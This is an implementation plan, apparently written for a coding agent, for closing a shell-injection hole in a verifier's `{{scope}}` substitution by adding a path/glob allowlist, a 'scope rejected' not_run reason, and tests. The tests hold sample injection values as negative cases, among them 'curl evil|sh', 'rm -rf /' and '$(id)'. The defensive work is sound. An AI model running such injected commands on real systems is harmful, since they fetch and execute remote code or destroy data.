# Plan 001: Reject verifier scopes that contain shell metacharacters, so `{{scope}}` can never inject into the verifier command

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving to the
> next step. If anything in the "STOP conditions" section occurs, stop and
> report — do not improvise. When done, update the status row for this plan
> in `plans/README.md` — unless a reviewer dispatched you and told you they
> maintain the index.
>
> **Drift check (run first)**:
> `git diff --stat e2749a2..HEAD -- src/verify/descriptors.ts src/verify/run.ts src/verify/select.ts tests/verify/select.test.ts`
> If any of those files changed since this plan was written, compare the
> "Current state" excerpts against the live code before proceeding; on a
> mismatch, treat it as a STOP condition.

## Status

- **Priority**: P1
- **Effort**: S
- **Risk**: LOW
- **Depends on**: none
- **Category**: security
- **Planned at**: commit `e2749a2`, 2026-09-21

## Why this matters

A verifier's `scope` is substituted verbatim into a command template and the
result is run through the platform shell (`shell: true`). The scope is not
trusted data: it comes either from `contract.verification.criteria[].scope`
(free text, model- or PRD-authored) or from the changed test file paths on disk.
A scope such as `tests/a.spec.ts; curl … | sh` therefore executes as a second
shell command. The verifier runs outside `installPermissionGuard`, so the
permission engine never sees it and cannot refuse it. This plan makes an unsafe
scope fail closed: the verifier resolves to no command and is recorded as
`not_run`, which the proof gate already understands.

## Current state

Files involved:

- `src/verify/descriptors.ts` — the verifier registry; owns the command
  template table (`DEFAULT_COMMANDS`), the `{{scope}}` substitution and
  `resolveCommand`. **This is the only source file you will change.**
- `src/verify/run.ts` — `execShell`; spawns the resolved string with
  `shell: true`. You will read it to confirm the sink; you will not change it.
- `src/verify/select.ts` — `selectVerifiers` decides each descriptor's `scope`
  (`scopeFor`, `targetedSurfaceOf`); you will read it to understand provenance,
  and change nothing.
- `tests/verify/select.test.ts` — the existing command-assertion suite; your new
  tests go here.
- `tests/verify/support.ts` — fixtures: `contractOf`, `recordingExec`,
  `tempWorkspace`, `writeFiles`.

The substitution, as it exists today (`src/verify/descriptors.ts:111-121`):

```ts
/** A template with `{{scope}}` and no scope is empty, not a command with a hole in it. */
function applyScope(template: string, scope: string): string {
	const trimmed = template.trim();
	if (!trimmed.includes("{{scope}}")) return trimmed;
	return scope.trim().length === 0 ? "" : trimmed.replaceAll("{{scope}}", scope).trim();
}

/** The command a kind runs for a scope, with config overrides on top of the table. */
export function resolveCommand(kind: string, scope: string, overrides: Partial<Record<string, string>> = {}): string {
	return applyScope(overrides[kind] ?? DEFAULT_COMMANDS[kind] ?? "", scope);
}
```

The sink it feeds (`src/verify/run.ts:26-28`):

```ts
export const execShell: ShellExec = (command, cwd, timeoutMs) =>
	new Promise<ShellRunResult>((resolve) => {
		const child = spawn(command, { cwd, shell: true, detached: true, stdio: ["ignore", "pipe", "pipe"] });
```

The template that carries `{{scope}}` (`src/verify/descriptors.ts:45`):

```ts
	targeted_test: "npx vitest run {{scope}}",
```

The empty-command path, already present, that you are reusing
(`src/verify/descriptors.ts:139-152`) — note the second line: an empty
`descriptor.command` falls back to re-applying the raw template, so the guard
must live inside `applyScope` to cover both calls:

```ts
export function shellVerifier(command: string, parse?: ShellParse): VerifierRunner {
	return {
		async run(descriptor, context) {
			const resolved = descriptor.command.trim() || applyScope(command, descriptor.scope);
			if (resolved.length === 0) {
				const reason = `no command resolved for ${descriptor.kind}${descriptor.scope.length === 0 ? ": the contract declared no scope" : ""}`;
				return verifierOutcome(descriptor, "not_run", {
					reason,
					artifactRef: captureArtifact(context.artifacts, descriptor.kind, reason),
				});
			}
```

How the scope reaches a descriptor (`src/verify/select.ts:45-46, 125-138`):

```ts
export function targetedSurfaceOf(files: readonly string[]): string {
	return files.filter((file) => TEST_FILE_PATTERN.test(file) || TEST_DIRECTORY_PATTERN.test(file)).join(" ");
}
```
```ts
function scopeFor(kind: VerifierKind, criteria: readonly CriterionVerification[], derived = ""): string {
	if ((DEFAULT_SCOPES[kind] ?? "").length > 0) return DEFAULT_SCOPES[kind]!;
	const declared = criteria.find(
		(entry) => entry.scope !== undefined && entry.scope.trim().length > 0 && (entry.verifiers ?? []).some((name) => normalizeVerifierKind(name) === kind),
	);
	if (declared?.scope !== undefined) return declared.scope.trim();
	return kind === "targeted_test" ? derived : "";
}
```

`verifyTask` only records a command it actually resolved
(`src/verify/index.ts:157`): `if (descriptor.command.length > 0) commands.push(descriptor.command);`

Repo conventions to match:

- Comments explain *why*, not *what*; a non-obvious ceiling gets a
  `ponytail:` note naming the upgrade path (see `src/verify/descriptors.ts:39`
  and `src/permissions/secrets.ts:10-12`). Match this style.
- Tests assert the **executed command list**, not just the selected kinds —
  see the pattern at `tests/verify/select.test.ts:44-66`. The header comment
  there states the reason: "a verifier that is selected but never run cannot
  pass the test".
- Tests import source modules with a `.js` specifier
  (`../../src/verify/select.js`); vitest maps it to the `.ts` source. Do the same.

## Commands you will need

| Purpose | Command | Expected on success |
| --- | --- | --- |
| Install | `pnpm install` | exit 0 |
| Typecheck | `pnpm typecheck` | exit 0, no errors |
| Lint | `pnpm lint` | exit 0 (warnings allowed; no new ones) |
| Targeted tests | `pnpm test -- tests/verify/select.test.ts` | all pass |
| Full suite | `pnpm test` | 640+ pass, 10 skipped, exit 0 |

## Scope

**In scope** (the only files you should modify):

- `src/verify/descriptors.ts`
- `tests/verify/select.test.ts`

**Out of scope** (do NOT touch, even though they look related):

- `src/verify/run.ts` — `shell: true` stays. Running a project's own verifiers
  is inherently shell execution; the defect is the unquoted interpolation, not
  the shell.
- `src/verify/select.ts` — do not sanitize at selection time. Keeping the guard
  in `applyScope` covers `resolveCommand` callers in `proof/recover.ts` too,
  which selection-time filtering would miss.
- `src/runtime/proc.ts` — a different spawn boundary with its own command
  provenance; not part of this finding.
- Any change to `DEFAULT_COMMANDS` values or to the `{{scope}}` template syntax.
- Any behaviour change for scopes that are already safe.

## Git workflow

- Branch: `fix/verify-scope-injection`
- Commit style is conventional commits with a scope, e.g.
  `fix(verify): reject shell metacharacters in a verifier scope`
  (matches `git log`: `fix(ui): let ctrl+t expand a folded block …`).
- One commit for the fix + tests is fine. Do NOT push or open a PR.

## Steps

### Step 1: Add the scope allowlist and apply it in `applyScope`

In `src/verify/descriptors.ts`, immediately above `applyScope` (currently line
111), add the pattern and predicate:

```ts
/**
 * The characters a verifier scope may contain: path and glob shapes only.
 * `{{scope}}` is substituted into a command that runs through the platform
 * shell, and the scope can be contract- or filename-derived, so anything else —
 * a `;`, `|`, `&`, `$`, backtick, quote, backslash or newline — would be a
 * second shell command. A rejected scope resolves to no command, never to a
 * quoted guess.
 */
const SAFE_SCOPE = /^[A-Za-z0-9_@=:+,.\/*?\[\]{}~ -]*$/;

/** Whether a scope is a path/glob surface, and so may be substituted into a command. */
export function isSafeScope(scope: string): boolean {
	return SAFE_SCOPE.test(scope);
}
```

Then change `applyScope` so an unsafe non-empty scope resolves to `""`:

```ts
/** A template with `{{scope}}` and no scope — or an unsafe one — is empty, not a command with a hole in it. */
function applyScope(template: string, scope: string): string {
	const trimmed = template.trim();
	if (!trimmed.includes("{{scope}}")) return trimmed;
	const value = scope.trim();
	if (value.length === 0 || !isSafeScope(value)) return "";
	return trimmed.replaceAll("{{scope}}", value).trim();
}
```

Leave `resolveCommand` exactly as it is.

**Verify**: `pnpm typecheck` → exit 0.

### Step 2: Name the rejection in the `not_run` reason

An empty command currently reports "no command resolved", which does not tell
the reader the scope was rejected. In `shellVerifier.run`
(`src/verify/descriptors.ts:142-144`), replace the reason expression with:

```ts
			if (resolved.length === 0) {
				const rejected = descriptor.scope.trim().length > 0 && !isSafeScope(descriptor.scope);
				const reason = rejected
					? `verifier scope rejected for ${descriptor.kind}: the scope is not a path or glob surface`
					: `no command resolved for ${descriptor.kind}${descriptor.scope.length === 0 ? ": the contract declared no scope" : ""}`;
				return verifierOutcome(descriptor, "not_run", {
					reason,
					artifactRef: captureArtifact(context.artifacts, descriptor.kind, reason),
				});
			}
```

Do not change anything else in the `if` block.

**Verify**: `pnpm typecheck` → exit 0.

### Step 3: Add the tests

Append a new `describe` block to `tests/verify/select.test.ts`. Import
`resolveCommand` alongside the existing imports:

```ts
import { resolveCommand } from "../../src/verify/descriptors.js";
```

Add this block at the end of the file:

```ts
/**
 * The scope is untrusted text substituted into a `shell: true` command, so a
 * metacharacter-bearing scope must resolve to no command at all. The positive
 * controls (a path, a glob) are asserted beside the negative ones so the guard
 * cannot pass by rejecting everything.
 */
describe("verifier scope injection is refused, not quoted", () => {
	it("substitutes a path or glob scope, and refuses anything with a shell metacharacter", () => {
		expect(resolveCommand("targeted_test", "tests/x.spec.ts")).toBe("npx vitest run tests/x.spec.ts");
		expect(resolveCommand("targeted_test", "tests/**/*.spec.ts")).toBe("npx vitest run tests/**/*.spec.ts");
		for (const scope of ["tests/x.spec.ts; curl evil|sh", "tests/x.spec.ts && rm -rf /", "$(id)", "tests/x.spec.ts > /tmp/pwned", "tests/x.spec.ts\nrm -rf /"]) {
			expect(resolveCommand("targeted_test", scope), scope).toBe("");
		}
	});

	it("records a metacharacter scope as not_run and never executes it", async () => {
		const root = tempWorkspace();
		writeFiles(root, { "src/a.ts": "export const a = 1;\n" });
		const exec = recordingExec();

		const result = await verifyTask(
			contractOf({
				required: ["typecheck", "affected_tests"],
				criteria: [{ id: "AC-1", verifiers: ["affected_tests"], scope: "tests/x.spec.ts; curl evil|sh" }],
			}),
			root,
			{ exec: exec.exec, touchedPaths: ["src/a.ts"], diff: { files: ["src/a.ts"] } },
		);

		const targeted = result.records.find((record) => record.kind === "targeted_test");
		expect(targeted?.status).toBe("not_run");
		expect(targeted?.reason).toContain("scope rejected");
		expect(exec.commands.some((command) => command.includes(";") || command.includes("curl"))).toBe(false);
		expect(exec.commands).toContain("npm run typecheck");
	});
});
```

Notes for the executor:

- `contractOf` and `recordingExec` come from `./support.js`; `tempWorkspace`
  and `writeFiles` are already imported in this file.
- `affected_tests` normalizes to the `targeted_test` kind — this is the same
  alias the existing `BUGFIX_CRITERIA` fixture relies on
  (`tests/verify/select.test.ts:22,57`).
- Do not add `gitInit` here; the neighbouring narrow-scope test does not use it
  and `workspaceHash` tolerates a non-repo workspace.

**Verify**: `pnpm test -- tests/verify/select.test.ts` → all tests pass,
including the two new ones.

### Step 4: Confirm nothing else regressed

**Verify**: `pnpm typecheck` → exit 0
**Verify**: `pnpm lint` → exit 0, no new warnings in `src/verify/descriptors.ts`
**Verify**: `pnpm test` → full suite passes (640+ passed, 10 skipped), exit 0

## Test plan

- New file content: two tests in `tests/verify/select.test.ts` (Step 3).
  - Positive controls: a plain path and a glob still resolve to a command.
  - Negative cases: `;`, `&&`, `$(…)`, `>`, and a newline each resolve to `""`.
  - End-to-end: `verifyTask` records `not_run` with a reason containing
    "scope rejected", and the recording seam never sees a command carrying the
    injected text.
- Structural pattern: the existing `"selects and runs different verifier sets …"`
  test at `tests/verify/select.test.ts:44-66` — same fixtures, same
  command-list assertions.
- Verification: `pnpm test -- tests/verify/select.test.ts` → all pass.

## Done criteria

Machine-checkable. ALL must hold:

- [ ] `pnpm typecheck` exits 0
- [ ] `pnpm test` exits 0, and the two new tests in `tests/verify/select.test.ts` pass
- [ ] `grep -n "SAFE_SCOPE\|isSafeScope" src/verify/descriptors.ts` shows the pattern, the predicate and both uses (`applyScope`, `shellVerifier`)
- [ ] `grep -rn "replaceAll(\"{{scope}}\"" src/` returns exactly one match, inside `applyScope`, guarded by `isSafeScope`
- [ ] `git status --short` lists only `src/verify/descriptors.ts` and `tests/verify/select.test.ts` as modified
- [ ] `plans/README.md` status row for plan 001 is updated

## STOP conditions

Stop and report back (do not improvise) if:

- The code at `src/verify/descriptors.ts:111-121` or `:139-152` does not match
  the excerpts above (the file has drifted since this plan was written).
- A legitimate existing scope in the test suite is rejected by `SAFE_SCOPE`
  (i.e. a test that previously expected a resolved command now gets `""`).
  Report which scope, do not widen the pattern on your own judgement.
- `resolveCommand` turns out to have a caller that passes a scope containing a
  shell construct *on purpose* (e.g. a documented `-t "name"` filter). Report it
  rather than adding an exception.
- You find yourself needing to modify a file outside the in-scope list.

## Maintenance notes

- **Accepted trade-off.** Scopes containing quotes, backslashes, `$`, `*`-free
  shell syntax, or Windows-style `C:\…` paths are now rejected and become
  `not_run`. The repo's scopes are POSIX relative paths and globs. If a future
  feature needs a scope with a quoted test-name filter, extend
  `DEFAULT_COMMANDS`/the template rather than relaxing `SAFE_SCOPE`.
- **The guard lives in `applyScope` on purpose.** `shellVerifier.run` falls back
  to `applyScope(command, descriptor.scope)` when `descriptor.command` is empty,
  so a guard placed only in `resolveCommand` would be bypassed by that fallback.
  Any future refactor of that fallback must preserve the guard.
- **Reviewer should scrutinize**: that the pattern still admits the scopes the
  suite actually uses (`tests/verify/*.test.ts`, `tests/**/*.spec.ts`), and that
  `not_run` (not `fail`) is the status — a rejected scope is an unavailable
  check, and the proof gate treats those differently.
- **Deferred, out of scope**: the trust surface of `leanpi.config.yaml`
  (`backends[].command`, `verify.commands`) is a separate finding; do not fold
  it into this plan. Likewise the environment allowlist applied only to the
  `execute` tool.
